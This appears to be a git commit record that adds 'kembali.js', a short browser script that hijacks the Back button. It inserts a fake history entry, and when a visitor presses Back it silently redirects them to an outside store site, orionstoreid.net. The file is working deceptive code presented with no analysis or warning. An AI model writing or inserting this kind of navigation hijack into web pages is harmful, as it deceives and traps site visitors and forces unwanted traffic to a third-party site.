770a4c1e85210a9d9362946cfdbb4ae4caebb506
darylfarahi <daryl30011996@gmail.com>
2017-11-19 08:00:25 +0700

    Create kembali.js

---
+++ kembali.js
@@ -0,0 +1,13 @@
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
+
+window.addEventListener("popstate", function() {
+  if(location.hash === "#!/history") {
+    history.replaceState(null, document.title, location.pathname);
+    setTimeout(function(){
+      location.replace("http://orionstoreid.net/?i=1");
+    },0);
+  }
+}, false);
+}(window, location));
